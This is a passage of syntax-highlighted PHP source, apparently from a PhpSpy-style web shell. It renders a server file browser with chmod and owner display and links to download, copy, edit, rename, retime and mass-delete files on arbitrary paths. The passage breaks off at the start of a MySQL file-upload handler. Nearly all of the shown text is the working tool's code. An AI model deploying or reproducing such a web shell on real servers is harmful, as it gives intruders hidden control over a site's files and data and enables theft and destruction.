<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">closedir(</span>$<span style="color: #eeeeec;">dirs</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">sort(</span>$<span style="color: #eeeeec;">dirdata</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">sort(</span>$<span style="color: #eeeeec;">filedata</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dir_i</span> = <span style="color: #ad7fa8; font-style: italic;">'0'</span>;

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;form id="filelist" name="filelist" action="'</span>.$<span style="color: #eeeeec;">self</span>.<span style="color: #ad7fa8; font-style: italic;">'" method="post"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'file'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'thefile'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'doing'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dir'</span>,$<span style="color: #eeeeec;">nowpath</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #eeeeec;">dirdata</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">key</span> =&gt; $<span style="color: #eeeeec;">dirdb</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'filename'</span>]!=<span style="color: #ad7fa8; font-style: italic;">'..'</span> &amp;&amp; $<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'filename'</span>]!=<span style="color: #ad7fa8; font-style: italic;">'.'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">getdir</span> &amp;&amp; $<span style="color: #eeeeec;">getdir</span> == $<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>]) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">attachsize</span> = <span style="color: #eeeeec; background-color: #2e3436;">dirsize(</span>$<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>]);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">attachsize</span> = <span style="color: #eeeeec; background-color: #2e3436;">is_numeric(</span>$<span style="color: #eeeeec;">attachsize</span>) ? <span style="color: #eeeeec; background-color: #2e3436;">sizecount(</span>$<span style="color: #eeeeec;">attachsize</span>) : <span style="color: #ad7fa8; font-style: italic;">'Unknown'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">attachsize</span> = <span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:getsize(\''</span>.$<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>].<span style="color: #ad7fa8; font-style: italic;">'\',\''</span>.$<span style="color: #eeeeec;">dir</span>.<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;Stat&lt;/a&gt;'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">thisbg</span> = <span style="color: #eeeeec; background-color: #2e3436;">bg(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="'</span>.$<span style="color: #eeeeec;">thisbg</span>.<span style="color: #ad7fa8; font-style: italic;">'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''</span>.$<span style="color: #eeeeec;">thisbg</span>.<span style="color: #ad7fa8; font-style: italic;">'\';"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'</span>.$<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>].<span style="color: #ad7fa8; font-style: italic;">'"&gt;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;&lt;a href="javascript:godir(\''</span>.$<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>].<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;'</span>.$<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'filename'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/a&gt;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''</span>.$<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>].<span style="color: #ad7fa8; font-style: italic;">'\',\''</span>.$<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'dirlink'</span>].<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;'</span>.$<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'mtime'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/a&gt;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td nowrap&gt;'</span>.$<span style="color: #eeeeec;">attachsize</span>.<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>].<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;'</span>.$<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'dirchmod'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/a&gt; / '</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>].<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;'</span>.$<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'dirperm'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/a&gt;'</span>.$<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'fileowner'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td nowrap&gt;&lt;a href="javascript:rename(\''</span>.$<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>].<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;Rename&lt;/a&gt;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dir_i</span>++;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'filename'</span>]==<span style="color: #ad7fa8; font-style: italic;">'..'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class='</span>.<span style="color: #eeeeec; background-color: #2e3436;">bg(</span>).<span style="color: #ad7fa8; font-style: italic;">'&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td align="center"&gt;-&lt;/td&gt;&lt;td nowrap colspan="5"&gt;&lt;a href="javascript:godir(\''</span>.<span style="color: #eeeeec; background-color: #2e3436;">getUpPath(</span>$<span style="color: #eeeeec;">nowpath</span>).<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"&gt;&lt;td colspan="6" height="5"&gt;&lt;/td&gt;&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">file_i</span> = <span style="color: #ad7fa8; font-style: italic;">'0'</span>;

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #eeeeec;">filedata</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">key</span> =&gt; $<span style="color: #eeeeec;">filedb</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'filename'</span>]!=<span style="color: #ad7fa8; font-style: italic;">'..'</span> &amp;&amp; $<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'filename'</span>]!=<span style="color: #ad7fa8; font-style: italic;">'.'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fileurl</span> = <span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span>$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">"DOCUMENT_ROOT"</span>],<span style="color: #ad7fa8; font-style: italic;">''</span>,$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>]);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">thisbg</span> = <span style="color: #eeeeec; background-color: #2e3436;">bg(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="'</span>.$<span style="color: #eeeeec;">thisbg</span>.<span style="color: #ad7fa8; font-style: italic;">'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''</span>.$<span style="color: #eeeeec;">thisbg</span>.<span style="color: #ad7fa8; font-style: italic;">'\';"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>].<span style="color: #ad7fa8; font-style: italic;">'"&gt;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.((<span style="color: #eeeeec; background-color: #2e3436;">strpos(</span>$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>], $<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">"DOCUMENT_ROOT"</span>]) !== <span style="color: #8ae234;">false</span>) ? <span style="color: #ad7fa8; font-style: italic;">'&lt;a href="'</span>.$<span style="color: #eeeeec;">fileurl</span>.<span style="color: #ad7fa8; font-style: italic;">'" target="_blank"&gt;'</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'filename'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/a&gt;'</span> : $<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'filename'</span>]).<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>].<span style="color: #ad7fa8; font-style: italic;">'\',\''</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'dirlink'</span>].<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;'</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'mtime'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/a&gt;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td nowrap&gt;'</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'size'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>].<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;'</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'filechmod'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/a&gt; / '</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>].<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;'</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'fileperm'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/a&gt;'</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'fileowner'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:dofile(\'downfile\',\''</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>].<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;Down&lt;/a&gt; | '</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:copyfile(\''</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>].<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;Copy&lt;/a&gt; | '</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:opfile(\'editfile\',\''</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>].<span style="color: #ad7fa8; font-style: italic;">'\',\''</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'dirlink'</span>].<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;Edit&lt;/a&gt; | '</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:rename(\''</span>.$<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>].<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;Rename&lt;/a&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">file_i</span>++;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last modified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="'</span>.<span style="color: #eeeeec; background-color: #2e3436;">bg(</span>).<span style="color: #ad7fa8; font-style: italic;">'"&gt;&lt;td align="center"&gt;&lt;input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;&lt;td colspan="4"&gt;&lt;a href="javascript:dofile(\'delfiles\');"&gt;Delete selected&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;'</span>.$<span style="color: #eeeeec;">dir_i</span>.<span style="color: #ad7fa8; font-style: italic;">' directories / '</span>.$<span style="color: #eeeeec;">file_i</span>.<span style="color: #ad7fa8; font-style: italic;">' files&lt;/td&gt;&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/form&gt;&lt;/table&gt;'</span>);
}<span style="color: #888a85;">// </span><span style="color: #888a85;">end dir</span>

<span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">action</span> == <span style="color: #ad7fa8; font-style: italic;">'sqlfile'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">doing</span>==<span style="color: #ad7fa8; font-style: italic;">"mysqlupload"</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">file</span> = $<span style="color: #8ae234;">_FILES</span>[<span style="color: #ad7fa8; font-style: italic;">'uploadfile'</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filename</span> = $<span style="color: #eeeeec;">file</span>[<span style="color: #ad7fa8; font-style: italic;">'tmp_name'</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">file_exists(</span>$<span style="color: #eeeeec;">savepath</span>)) {
